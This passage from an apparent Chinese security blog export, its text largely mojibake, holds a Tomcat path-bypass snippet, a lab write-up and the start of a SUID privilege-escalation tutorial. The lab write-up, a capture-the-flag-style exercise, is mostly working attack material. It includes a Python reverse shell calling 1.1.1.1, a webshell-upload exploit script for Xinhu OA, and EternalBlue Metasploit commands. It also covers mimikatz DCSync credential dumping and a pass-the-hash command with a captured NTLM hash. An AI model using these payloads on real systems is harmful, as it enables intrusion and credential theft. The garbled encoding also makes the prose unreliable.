xmlns:xsi=http://www.w3.org/2001/XMLSchema-instance xsi:schemaLocation=http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd version=4.0 filter filter-nametestFilter/filter-name filter-classfilter.testFilter/filter-class /filter filter-mapping filter-nametestFilter/filter-name url-pattern/*/url-pattern /filter-mapping/web-app è¿è¡Œä¹‹åï¼Œè®¿é—®http://localhost:8080/urltest/info/secret.jspï¼Œä¼šæ˜¾ç¤ºæ— æƒé™ï¼š æ ¹æ®å‰é¢çš„åˆ†ææ„é€ å¦‚ä¸‹å‡ ä¸ªpayloadéƒ½èƒ½æˆåŠŸç»•è¿‡è®¤è¯é™åˆ¶æ¥è®¿é—®ï¼š http://localhost:8080/urltest/./info/secret.jsphttp://localhost:8080/urltest/;mi1k7ea/info/secret.jsphttp://localhost:8080/urltest/mi1k7ea/../info/secret.jsp æ•´ä¸ªçš„è¿‡ç¨‹å¤§è‡´å¦‚æ­¤ï¼Œå°±æ˜¯åˆ©ç”¨è§£æçš„å·®å¼‚æ€§æ¥ç»•è¿‡è®¤è¯ã€‚ PSåœ¨ Spring Boot 2.5.0 å¼€å§‹ï¼Œå®˜æ–¹å¼•å…¥äº†ä¸€ä¸ªå®‰å…¨æ€§ä¿®å¤ï¼š ç¦æ­¢å¯¹é™æ€èµ„æºè·¯å¾„è¿›è¡Œ ..ï¼ˆç›®å½•ç©¿è¶Šï¼‰è§£æã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ è®¿é—®ç±»ä¼¼ï¼š http://localhost:8080/../../application.properties åœ¨ Spring Boot 2.4.x åŠä¹‹å‰ï¼Œå¯èƒ½ä¼šè¢« TomcatWebFlux çš„é™æ€èµ„æºè§£æå™¨å¤„ç†ï¼ˆå…·ä½“è¡Œä¸ºä¾èµ–é…ç½®ï¼Œæœ‰äº›æƒ…å†µä¸‹èƒ½â€œé€ƒé€¸â€åˆ°èµ„æºç›®å½•å¤–ï¼‰ã€‚ ä» Spring Boot 2.5.0 èµ·ï¼Œè¿™ä¸ªè¢«ç›´æ¥æ‹¦æˆªï¼Œè¿”å› 400 æˆ– 404ã€‚"},{"title":"æ˜¥ç§‹äº‘é•œ-initial","path":"/2025/08/20/æ˜¥ç§‹äº‘é•œ-initial/","content":"å‚è€ƒæ˜¥ç§‹äº‘å¢ƒInitial WP å‰è¨€è¿™é¶åœºè¯´éš¾ä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œä¸»è¦å°±æ˜¯è¦ç†Ÿæ‚‰å„ç§å·¥å…·çš„åº”ç”¨ï¼Œé…ç½®ç­‰ï¼Œè¿™äº›éƒ½éœ€è¦è€—è´¹ä¸å°‘çš„æ—¶é—´ é¶æ ‡ä»‹ç»Initialæ˜¯ä¸€å¥—éš¾åº¦ä¸ºç®€å•çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶åˆæ­¥è®¤è¯†å†…ç½‘æ¸—é€çš„ç®€å•æµç¨‹ã€‚è¯¥é¶åœºåªæœ‰ä¸€ä¸ªflagï¼Œå„éƒ¨åˆ†ä½äºä¸åŒçš„æœºå™¨ä¸Š flag01é¦–å…ˆæ‹¿åˆ°ç«™ç‚¹ï¼Œå°±ä¸€ä¸ªç™»å½•æ¡†ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œç‚¹å‡»æ³¨å†Œä¹Ÿæ²¡æœ‰ä»»ä½•ååº”ï¼Œéšä¾¿å°è¯•äº†å‡ ä¸ªå¼±å£ä»¤ä¹Ÿéƒ½æ²¡æœ‰ååº” çœ‹äº†çœ¼ç½‘ç«™çš„iconï¼Œæ˜¯thinphpï¼Œäºæ˜¯å°±å…ˆç›´æ¥ä¸Šthinkphpçš„å·¥å…· æ£€æµ‹åˆ°æœ‰ç›¸å…³çš„rceæ¼æ´ï¼Œç›´æ¥getshellï¼Œå†ç”¨èšå‰‘è¿ä¸Š èšå‰‘é‡Œé¢æœ‰ä¸€ä¸ªè™šæ‹Ÿç»ˆç«¯çš„åŠŸèƒ½å¯ä»¥ä½¿ç”¨ï¼Œä½†æ˜¯ç»è¿‡æˆ‘å‰å››ä¸ªé’Ÿå¤´è¡€çš„æ•™è®­ï¼Œè¿™åŠŸèƒ½æ˜¯çœŸçš„ä¸å¥½ç”¨ï¼Œå‘½ä»¤éš¾æ‰§è¡Œï¼Œè¿˜ä¼šåå›æ˜¾ç­‰ç­‰ï¼Œç™½ç™½æµªè´¹äº†å¥½å‡ ä¸ªæ²™æ¼ï¼ˆéƒ½æ˜¯é’±å•Š åé¢ä¸­é€”è½¬å»å­¦äº†ä¸‹linuxææƒå’Œå¦‚ä½•å‡çº§ä¸ºå®Œå…¨å¼shellåï¼Œå†³å®šç›´æ¥å¼¹åˆ°è‡ªå·±çš„vpsä¸Šæ¥æ“ä½œï¼ˆèˆ’æœå¤šäº† è‡ªå·±vpsä¸Šç›‘å¬ï¼šnc -lvvp 2333 åœ¨æœºå­çš„è™šæ‹Ÿç»ˆç«¯ä¸Šåå¼¹shell python3 -c import socket,subprocess,os;s=socket.socket();s.connect((1.1.1.1,2333));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([/bin/sh,-i]) ç»è¿‡ä¸€é¡¿æ“ä½œè½¬ä¸ºå®Œå…¨å¼shell å…ˆæŸ¥äº†ä¸‹è‡ªå·±çš„æƒé™ï¼Œå‘ç°æŒºä½çš„ï¼Œäºæ˜¯å‡†å¤‡ææƒï¼Œè¿™é‡Œç”¨sudoè¿›è¡Œææƒ mysqlå…·æœ‰rootæƒé™ï¼Œå¹¶ä¸”ä¸éœ€è¦å¯†ç å°±å¯ä»¥ï¼Œå»GTFOBinsæŸ¥ä¸€ä¸‹ -eç„¶ååé¢å¯ä»¥æ‰§è¡Œshellå‘½ä»¤ï¼Œç„¶åæŸ¥æ‰¾flagï¼Œsudo mysql -e \\! find / -name *flag*,æ‰¾åˆ°åç›´æ¥catï¼Œflag01å¦‚ä¸‹ï¼š flag02å¼€å§‹åœ¨å†…ç½‘è¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œåœ¨èšå‰‘ä¸­ä¸Šä¼ ä¸€ä¸‹fscanå·¥å…·ï¼Œå¹¶èµ‹ä¸€ä¸‹æ‰§è¡Œæƒé™ï¼šchmod +x fscan_amd64 å…ˆifconfigæŸ¥ä¸€ä¸‹è‡ªå·±çš„å†…ç½‘ip ç„¶åæ‰«æä¸€æ‰‹ www-data@ubuntu-web01:/var/www/html$ ./fscan_amd64 -h 172.22.1.0/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.2start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2 is alive(icmp) Target 172.22.1.15 is alive(icmp) Target 172.22.1.18 is alive(icmp) Target 172.22.1.21 is alive[*] Icmp alive hosts len is: 4172.22.1.18:3306 open172.22.1.21:445 open172.22.1.18:445 open172.22.1.2:445 open172.22.1.21:139 open172.22.1.18:139 open172.22.1.2:139 open172.22.1.21:135 open172.22.1.18:135 open172.22.1.2:135 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] NetInfo:[*]172.22.1.21 [-]XIAORANG-WIN7 [-]172.22.1.21[*] NetInfo:[*]172.22.1.2 [-]DC01 [-]172.22.1.2[*] NetInfo:[*]172.22.1.18 [-]XIAORANG-OA01 [-]172.22.1.18[*] NetBios: 172.22.1.2 [+]DC DC01.xiaorang.lab Windows Server 2016 Datacenter 14393 [*] WebTitle: http://172.22.1.15 code:200 len:5578 title:Bootstrap Material Admin[*] 172.22.1.2 (Windows Server 2016 Datacenter 14393)[+] 172.22.1.21\tMS17-010\t(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios: 172.22.1.21 XIAORANG-WIN7.xiaorang.lab Windows Server 2008 R2 Enterprise 7601 Service P[*] NetBios: 172.22.1.18 XIAORANG-OA01.xiaorang.lab Windows Server 2012 R2 Datacenter 9600 [*] WebTitle: http://172.22.1.18 code:302 len:0 title:None è·³è½¬url: http://172.22.1.18?m=login[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012 title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1å·²å®Œæˆ 14/14[*] æ‰«æç»“æŸ,è€—æ—¶: 13.334454435s æ‰«å‡º4å°å­˜æ´»çš„æœºå­ï¼Œå…¶ä¸­æœ‰ä¸€å°æˆ‘ä»¬å·²ç»æ‰“è¿‡äº† è¿™é‡Œæˆ‘ä»¬é€‰æ‹©å¯¹ä¿¡å‘¼è¿™å°æœºå­ä¸‹æ‰‹ ä½†æ˜¯è¿™æ˜¯å†…ç½‘çš„æœºå­ï¼Œæˆ‘ä»¬å¤–é¢ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œæ‰€ä»¥å°±éœ€è¦é€šè¿‡frpåä»£å‡ºæ¥è¿›è¡Œè®¿é—® frpç›¸å…³æ“ä½œå‚è€ƒï¼šhttps://blog.csdn.net/weixin_43400024/article/details/139986585 è¿™é‡ŒæœåŠ¡ç«¯ä¾¿æ˜¯æˆ‘è‡ªå·±çš„vpsï¼Œå¼€å¯ç›‘å¬ å®¢æˆ·ç«¯ä¹Ÿå°±æ˜¯é¶æœºï¼Œæ‰§è¡Œï¼šfrpc.exe -c frpc.toml ç„¶ååœ¨æœ¬æœºé…ç½®ä¸€ä¸‹proxifierè¿›è¡Œè®¿é—®ï¼Œå› ä¸ºæˆ‘ä»¬è¿™è¾¹éƒ½æ˜¯socks5è¿›è¡Œè¿æ¥ï¼Œç›´æ¥httpåè®®æ˜¯è®¿é—®ä¸äº†çš„ æ·»åŠ ä»£ç†æœåŠ¡å™¨ é…ç½®ä»£ç†è§„åˆ™ Defaultè§„åˆ™çš„åŠ¨ä½œè¦é€‰æ‹©directï¼Œè¿™æ ·å­é™¤äº†è®¿é—®172.22.*.*çš„æœºå­ä¹‹å¤–è®¿é—®å…¶ä»–çš„éƒ½æ˜¯é»˜è®¤çš„ï¼Œè·Ÿå¹³å¸¸ä¸€æ · å…¨éƒ¨é…ç½®å®Œåè®¿é—®http://172.22.1.18/ï¼ŒæˆåŠŸï¼Œç›´æ¥é»˜è®¤çš„è´¦æˆ·å¯†ç ç™»å½•admin-admin123 ä¿¡å‘¼ä½ç‰ˆæœ¬å­˜åœ¨rceæ¼æ´ï¼Œè®²è§£ç½‘ä¸Šä¸€æœä¸€å¤§å † ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ è¿™é‡Œç›´æ¥è´´exp import requestssession = requests.session()url_pre = http://172.22.1.18/url1 = url_pre + ?a=checkm=logind=ajaxbool=truernd=533953url2 = url_pre + /index.php?a=upfilem=uploadd=publicmaxsize=100ajaxbool=truernd=798913# url3 = url_pre + /task.php?m=qcloudCos|runta=runfileid=IDdata1 = rempass: 0, jmpass: false, device: 1625884034525, ltype: 0, adminuser: YWRtaW4=, adminpass: YWRtaW4xMjM=, yanzm: r = session.post(url1, data=data1)r = session.post(url2, files=file: open(1.php, r+))filepath = str(r.json()[filepath])filepath = / + filepath.split(.uptemp)[0] + .phpprint(filepath)id = r.json()[id]url3 = url_pre + f/task.php?m=qcloudCos|runta=runfileid=idr = session.get(url3)r = session.get(url_pre + filepath + ?1=system(dir);)print(r.text) æ‹¿åˆ°è¿”å›çš„è·¯ç”±ï¼Œç›´æ¥èšå‰‘è¿ä¸Š æ‹¿åˆ°flag02 flag03æ¥ä¸‹æ¥å¼€å§‹æ‰“æ°¸æ’ä¹‹è“ï¼Œé…ç½®å¥½proxychainsï¼Œè®©å…¶confæ–‡ä»¶åŠ ä¸Š socks5 1.1.1.1 6028 ç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š proxychains msfconsoleuse exploit/windows/smb/ms17_010_eternalblueset payload windows/x64/meterpreter/bind_tcpshow options set rhosts 172.22.1.21run æˆåŠŸæ‹¿åˆ°shell æ¥ä¸‹æ¥å¼€å§‹æ¨ªå‘ load kiwi åŠ è½½æˆåŠŸåï¼Œä½ å°±å¯ä»¥åœ¨ Meterpreter é‡Œä½¿ç”¨ä¸€ç³»åˆ— Mimikatz é£æ ¼çš„å‘½ä»¤ï¼Œå¸¸è§åŠŸèƒ½åŒ…æ‹¬ï¼š å‡­æ®æŠ“å– creds_all â†’ åˆ—å‡ºæ‰€æœ‰èƒ½è·å–çš„å‡­æ®ï¼ˆæ˜æ–‡å¯†ç ã€å“ˆå¸Œã€ç¥¨æ®ç­‰ï¼‰ creds_msv â†’ æŠ“å– MSV è®¤è¯å‡­æ®ï¼ˆNTLM å“ˆå¸Œï¼‰ creds_ssp â†’ æŠ“å– SSP è®¤è¯ä¿¡æ¯ creds_wdigest â†’ æŠ“å– WDigest æ˜æ–‡å¯†ç  creds_kerberos â†’ æŠ“å– Kerberos ç¥¨æ® å“ˆå¸Œ ç¥¨æ®æ“ä½œ kerberos_ticket_list â†’ åˆ—å‡ºç°æœ‰çš„ Kerberos ç¥¨æ® kerberos_ticket_purge â†’ æ¸…é™¤ç¥¨æ® kerberos_ticket_use â†’ å¯¼å…¥ç¥¨æ®ï¼ˆPass-the-Ticketï¼‰ å…¶ä»–å…¸å‹æ“ä½œ golden_ticket_create â†’ ç”Ÿæˆé»„é‡‘ç¥¨æ® kerberos_ticket_use â†’ ä½¿ç”¨ç¥¨æ® lsa_dump_sam â†’ å¯¼å‡º SAM æ•°æ®åº“ kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv kiwi_cmd åœ¨ Meterpreter ä¸­ï¼Œkiwi_cmd ç”¨æ¥ç›´æ¥æ‰§è¡Œ mimikatz åŸç”Ÿå‘½ä»¤ã€‚ ç›¸å½“äºä½ åœ¨ç›®æ ‡æœºä¸Šè¿è¡Œ mimikatz.exeï¼Œç„¶åè¾“å…¥ lsadump::dcsync ...ã€‚ lsadump::dcsync è¿™æ˜¯ Mimikatz çš„ DCSync æ¨¡å—ã€‚ åŠŸèƒ½ï¼šä¼ªè£…æˆä¸€ä¸ªåŸŸæ§åˆ¶å™¨ï¼Œé€šè¿‡è°ƒç”¨ MS-DRSR (Directory Replication Service Remote Protocol) åè®®ï¼Œä»çœŸæ­£çš„åŸŸæ§åŒæ­¥å‡­æ®ã€‚ æœ¬è´¨ä¸Šå°±æ˜¯è¿œç¨‹å‘åŸŸæ§è¯·æ±‚ç”¨æˆ· NTLM å“ˆå¸Œã€Kerberos å¯†é’¥ç­‰æ•°æ®ã€‚ /domain:xiaorang.lab æŒ‡å®šç›®æ ‡åŸŸä¸º xiaorang.labã€‚ å¿…é¡»æ˜¯æœ‰æ•ˆçš„ AD åŸŸã€‚ /all å¯¼å‡ºåŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å‡­æ®ï¼ˆåŒ…æ‹¬ krbtgtã€ç®¡ç†å‘˜ç­‰ï¼‰ã€‚ å¦‚æœä¸åŠ ï¼Œåªä¼šå¯¼å‡ºæŒ‡å®šè´¦æˆ·ã€‚ /csv ä»¥ CSV æ ¼å¼è¾“å‡ºç»“æœï¼Œæ–¹ä¾¿åç»­ä¿å­˜ã€è§£ææˆ–å¯¼å‡ºã€‚ ç”±äºæ˜¯åˆšæ¥è§¦ï¼Œæ‰«å‡ºçš„è¿™äº›æœ‰å¿…è¦æ‹¿aiè¾…åŠ©è§£é‡Šä¸€æ‰‹ï¼Œè¿™äº›éƒ½æ˜¯æŠ“å–åˆ°çš„åŸŸç”¨æˆ·å‡­æ®ï¼ˆNTLM å“ˆå¸Œï¼‰ è¾“å‡ºçš„æ ¼å¼å¦‚ä¸‹ï¼š ç”¨æˆ·RID ç”¨æˆ·å NTLMå“ˆå¸Œ ç”¨æˆ·å±æ€§æ ‡å¿— RIDï¼ˆRelative Identifierï¼‰ æ¯ä¸ªåŸŸç”¨æˆ·åœ¨åŸŸé‡Œçš„å”¯ä¸€ IDã€‚ å¸¸è§ç‰¹æ®Š RIDï¼š 500 â†’ åŸŸç®¡ç†å‘˜ Administrator 502 â†’ krbtgt è´¦æˆ·ï¼ˆKerberos çš„å…³é”®è´¦æˆ·ï¼Œç”¨äºç¥¨æ®ç­¾å‘ï¼‰ 1000+ â†’ æ™®é€šåŸŸç”¨æˆ·è®¡ç®—æœºè´¦æˆ· ç”¨æˆ·å æ¯”å¦‚ Administratorã€Marcusã€Charlesã€‚ NTLM å“ˆå¸Œ è¿™æ˜¯ç”¨æˆ·å¯†ç çš„ NTLM å“ˆå¸Œï¼Œå¯ç”¨äºï¼š Pass-the-Hash (PtH) æ¨ªå‘æ¸—é€ çˆ†ç ´è¿˜åŸæ˜æ–‡ï¼ˆhashcat johnï¼‰ å±æ€§æ ‡å¿—ï¼ˆUserAccountControl å€¼ï¼‰ è¿™æ˜¯ç”¨æˆ·è´¦æˆ·å±æ€§çš„æ•´æ•°è¡¨ç¤ºï¼ˆåè¿›åˆ¶ï¼‰ã€‚ å¸¸è§å€¼ï¼š 512 â†’ æ™®é€šå¯ç”¨çš„åŸŸç”¨æˆ· 514 â†’ è´¦æˆ·ç¦ç”¨ 4096 â†’ å·¥ä½œç«™ æœåŠ¡å™¨çš„æœºå™¨è´¦æˆ· 532480 â†’ åŸŸæ§æœåŠ¡å™¨è´¦æˆ· è€Œæˆ‘ä»¬æ‰«åˆ°çš„ç»“æœåˆ†æå¦‚ä¸‹ï¼š 502 krbtgt åŸŸçš„ Kerberos æ ¹å¯†é’¥è´¦æˆ·ï¼Œå“ˆå¸Œå¯ç”¨äºä¼ªé€  **é»„é‡‘ç¥¨æ® (Golden Ticket)**ã€‚ 500 Administrator åŸŸç®¡ç†å‘˜ï¼Œæ‹¿åˆ°è¿™ä¸ªå“ˆå¸Œ æ‹¿ä¸‹æ•´ä¸ªåŸŸã€‚ 1106 Marcus / 1107 Charles æ™®é€šåŸŸç”¨æˆ·ï¼Œå¯ä»¥å°è¯•æ¨ªå‘æ¸—é€ã€‚ 1000 DC01$ åŸŸæ§åˆ¶å™¨æœºå™¨è´¦æˆ·ã€‚ä¹Ÿèƒ½ç”¨äº DCSyncã€‚ 1104 XIAORANG-OA01$ / 1108 XIAORANG-WIN7$ åŸŸå†…ä¸»æœºçš„æœºå™¨è´¦æˆ·ã€‚ hashä¼ é€’ï¼Œæ‹¿åˆ°flag proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x type Users\\Administrator\\flag\\flag03.txt crackmapexec smb 172.22.1.2 å¯¹ç›®æ ‡ 172.22.1.2 ä¸»æœºå‘èµ· SMB åè®® è¿æ¥ã€‚ -u administrator ä½¿ç”¨åŸŸè´¦æˆ· administratorã€‚ -H 10cf89a850fb1cdbe6bb432b859164c8 ä½¿ç”¨ NTLM å“ˆå¸Œ è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆå³ Pass-the-Hash æŠ€æœ¯ï¼‰ã€‚ è¿™é‡Œçš„å“ˆå¸Œæ¥è‡ªä½ å‰é¢ DCSync æŠ“å–çš„ç»“æœã€‚ -d xiaorang.lab æŒ‡å®šåŸŸå xiaorang.labã€‚ -x type Users\\Administrator\\flag\\flag03.txt æˆåŠŸè®¤è¯åï¼Œåœ¨ç›®æ ‡æœºä¸Šæ‰§è¡Œå‘½ä»¤ è¯¥å‘½ä»¤çš„è¿‡ç¨‹å°±æ˜¯Pass-the-Hash â†’ SMB æ‰§è¡Œå‘½ä»¤ â†’ è¯» flag æ–‡ä»¶ è¿™é‡Œå†è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆä½¿ç”¨SMBåè®®æ¥è¿›è¡Œè¿æ¥ ä½œç”¨ï¼šåœ¨å±€åŸŸç½‘å†…æä¾›æ–‡ä»¶å…±äº«ã€æ‰“å°æœºå…±äº«ã€IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰ã€è¿œç¨‹ç®¡ç†ç­‰åŠŸèƒ½ã€‚ ç«¯å£ï¼š 445tcp â†’ ç°ä»£ SMB (ç›´è¿ TCP) 139tcp â†’ æ—§ç‰ˆ SMB (åŸºäº NetBIOS) Windows ç³»ç»Ÿä¸­å‡ ä¹å¿…å¼€ SMB æœåŠ¡ï¼Œå› ä¸ºå®ƒæ”¯æ’‘ç€ï¼š \\\\IP\\C$ â†’ å…±äº«ç£ç›˜ \\\\IP\\ADMIN$ â†’ ç®¡ç†å…±äº« \\\\IP\\IPC$ â†’ è¿œç¨‹ç®¡ç†ã€RPC è°ƒç”¨ é‚£ä¹ˆä¸ºä»€ä¹ˆèƒ½é€šè¿‡SMBåè®®æ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œè¿™ä¸»è¦æ˜¯å› ä¸ºWindows çš„ è¿œç¨‹ç®¡ç† å¾ˆå¤§ç¨‹åº¦ä¾èµ– SMBï¼Œä¾‹å¦‚ï¼š **IPC$**ï¼šè¿œç¨‹è°ƒç”¨è¿›ç¨‹æœåŠ¡ **ADMIN$ C$**ï¼šè®¿é—®ç³»ç»Ÿç›®å½• æœåŠ¡æ§åˆ¶ (SCM) å¯ä»¥é€šè¿‡ SMB å¯åŠ¨æ–°æœåŠ¡ ä»»åŠ¡è®¡åˆ’ (ATSCHTASKS) å¯ä»¥é€šè¿‡ SMB ä¸‹å‘ä»»åŠ¡ æ€»ç»“æ€»flagï¼šflag60b53231-2ce3-4813-87d4-e8f88d0d43d6 ç¬¬ä¸€æ¬¡æ‰“è¿™ç§é¶åœºï¼Œå³ä½¿æ˜¯çœ‹ç€ç½‘ä¸Šçš„wpè¿›è¡Œæ“ä½œä¾æ—§è€—è´¹äº†å¾ˆä¹…ï¼Œä¸»è¦åŸå› å°±æ˜¯å¯¹äºå·¥å…·çš„ä¸ç†Ÿæ‚‰ä»¥åŠèšå‰‘é‚£æå…¶ä¸å¥½ç”¨çš„è™šæ‹Ÿç»ˆç«¯","categories":["Write-Up"]},{"title":"linux webshellææƒ","path":"/2025/08/15/linux-webshellææƒ/","content":"å‚è€ƒLinux suidææƒ Linux suidææƒä»€ä¹ˆæ˜¯suidsuid(set uid)æ˜¯linuxä¸­çš„ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œsuidå¯ä»¥è®©è°ƒç”¨è€…ä»¥æ–‡ä»¶æ‹¥æœ‰è€…èº«ä»½è¿è¡Œè¯¥æ–‡ä»¶ï¼Œæ‰€ä»¥åˆ©ç”¨suidææƒçš„æ ¸å¿ƒå°±æ˜¯è¿è¡Œrootç”¨æˆ·æ‰€æ‹¥æœ‰çš„suidçš„æ–‡ä»¶ï¼Œé‚£ä¹ˆè¿è¡Œè¯¥æ–‡ä»¶çš„æ—¶å€™å°±å¾—è·å¾—rootç”¨æˆ·çš„èº«ä»½äº†ã€‚ suidç‰¹ç‚¹æ˜¯ç”¨æˆ·è¿è¡ŒæŸä¸ªç¨‹åºæ—¶ï¼Œå¦‚æœè¯¥ç¨‹åºæœ‰suidæƒé™ï¼Œç¨‹åºè¿è¡Œè¿›ç¨‹çš„å±ä¸»ä¸æ˜¯å‘èµ·è€…ï¼Œè€Œæ˜¯ç¨‹åºæ–‡ä»¶æ‰€å±çš„å±ä¸»ã€‚ linuxå¼•å…¥äº†3ä¸ªæ–‡ä»¶æ¥ç®¡ç†ç”¨æˆ·ç»„ï¼š etcpasswdå­˜æ”¾ç”¨æˆ·ä¿¡æ¯ã€‚ etcshadowå­˜æ”¾ç”¨æˆ·å¯†ç ä¿¡æ¯ã€‚ etcgroupå­˜æ”¾ç»„ä¿¡æ¯ã€‚ åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ¯ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å¤´é‡Œé¢æ·»åŠ äº†ç”¨æˆ·å’Œæ–‡ä»¶ä¹‹é—´çš„å…³ç³»ä¿¡æ¯ã€‚ ç”¨æˆ·ä¿¡æ¯etcpasswdæ¯è¡Œå…±æœ‰7ä¸ªå­—æ®µå†’å·éš”å¼€ï¼š å­—æ®µ1ä¸ºç”¨æˆ·åã€‚ å­—æ®µ2ä¸ºç”¨æˆ·çš„å¯†ç ã€‚ å­—æ®µ3ä¸ºæŒ‡UIDï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰è‡ªå·±çš„uidã€‚ å­—æ®µ4ä¸ºç»„UIDï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸åŒçš„uidã€‚ å­—æ®µ5ä¸ºè§£é‡Šè¯´æ˜çš„å­—æ®µã€‚ å­—æ®µ6ä¸ºæŒ‡ç”¨æˆ·çš„æ ¹ç›®å½•ã€‚ å­—æ®µ7ä¸ºæŒ‡ç™»å½•shellï¼Œç”¨æˆ·ç™»å½•shellï¼Œå½“å‰ä¸ºbinzshè¡¨ç¤ºå¯ä»¥ç™»å½•ï¼Œsbinnologinæ ‡è¯†ä¸è¢«æˆæƒç™»å½•ã€‚ å¦‚ä½•åˆ©ç”¨åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œè°ƒç”¨è€…ä¼šæš‚æ—¶è·å¾—è¯¥æ–‡ä»¶çš„æ‰€æœ‰è€…æƒé™ï¼Œä¸”è¯¥æƒé™åªåœ¨ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ä¸­æœ‰æ•ˆã€‚ åªæœ‰rootç”¨æˆ·çš„uidæ˜¯0ï¼Œå¦‚æœæŠŠä¸€ä¸ªæ™®é€šç”¨æˆ·çš„uidä¿®æ”¹ä¸º0ï¼Œé‚£ä¹ˆåªè¦ä»¥æ™®é€šç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°rootç”¨æˆ·ï¼Œåœ¨ç³»ç»ŸåŠ å›ºæ—¶ä¸€å®šè¦æ‰¾å‡ºæœ‰å“ªäº›ç”¨æˆ·çš„uidä¸º0ã€‚ å‡è®¾å¯æ‰§è¡Œæ–‡ä»¶binexecå…¶å±ä¸»ä¸ºrootï¼Œå½“ä»¥érootèº«ä»½ç™»å½•æ—¶ï¼Œå¦‚binexecè®¾ç½®äº†suidæƒé™ï¼Œå°±å¯ä»¥åœ¨érootèº«ä»½ä¸‹è¿è¡Œè¯¥å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶è¯¥è¿›ç¨‹çš„æƒé™ä¸ºrootæƒé™ã€‚ åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œå°±å¯é€šè¿‡suidè¿›è¡Œææƒã€‚ å¦‚ä½•è®¾ç½®suidåˆ©ç”¨ chmod u+s filename #è®¾ç½®suidchmod u-s filename #å»é™¤suid å¯ä»¥çœ‹è§ï¼Œæˆ‘ä»¬ç¤ºä¾‹çš„å›¾ç‰‡ç”± -rwå˜ä¸ºäº†-rwS,æ‰€ä»¥å°±æ˜¯æ·»åŠ ä¸Šäº†suidæƒé™ å¦‚ä½•æŸ¥æ‰¾suidæ–‡ä»¶å…·æœ‰suidæƒé™çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶æœ‰ï¼š nmapvimfindbashmorelessnanocpawk ä»ç½‘ä¸Šæ‰¾äº†å‡ ä¸ªå¸¸è§çš„å‘½ä»¤ æ›´å¤šæœ‰å…³suidçš„å¯ä»¥çœ‹GTFOBins find / -user root -perm -4000 -print 2/dev/nullfind / -perm -u=s -type f 2/dev/nullfind / -user root -perm -4000 -exec ls -ldb \\; ä»¥find -perm -us -type f 2devnullè®²è§£ä¸€ä¸‹å„ä¸ªå‚æ•°ä»£è¡¨ä»€ä¹ˆ find / -perm -u=s -type f 2/dev/null/è¡¨ç¤ºä»æ–‡ä»¶ç³»ç»Ÿçš„é¡¶éƒ¨ï¼ˆæ ¹ï¼‰å¼€å§‹å¹¶æ‰¾åˆ°æ¯ä¸ªç›®å½•-perm è¡¨ç¤ºæœç´¢éšåçš„æƒé™-u = sè¡¨ç¤ºæŸ¥æ‰¾rootç”¨æˆ·æ‹¥æœ‰çš„æ–‡ä»¶-typeè¡¨ç¤ºæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„æ–‡ä»¶ç±»å‹f è¡¨ç¤ºå¸¸è§„æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›®å½•æˆ–ç‰¹æ®Šæ–‡ä»¶2è¡¨ç¤ºè¯¥è¿›ç¨‹çš„ç¬¬äºŒä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå³stderrï¼ˆæ ‡å‡†é”™è¯¯ï¼‰è¡¨ç¤ºé‡å®šå‘/dev/nullæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿå¯¹è±¡ï¼Œå®ƒå°†ä¸¢å¼ƒå†™å…¥å…¶ä¸­çš„æ‰€æœ‰å†…å®¹ã€‚ åˆ©ç”¨ä»¥ä¸Šè¿™å‡ ä¸ªå‘½ä»¤å¯ä»¥æ‰¾åˆ°æ­£åœ¨ç³»ç»Ÿä¸Šè¿è¡Œçš„æ‰€æœ‰suidå¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä¹Ÿå¯ä»¥ä½¿ç”¨sudo -l 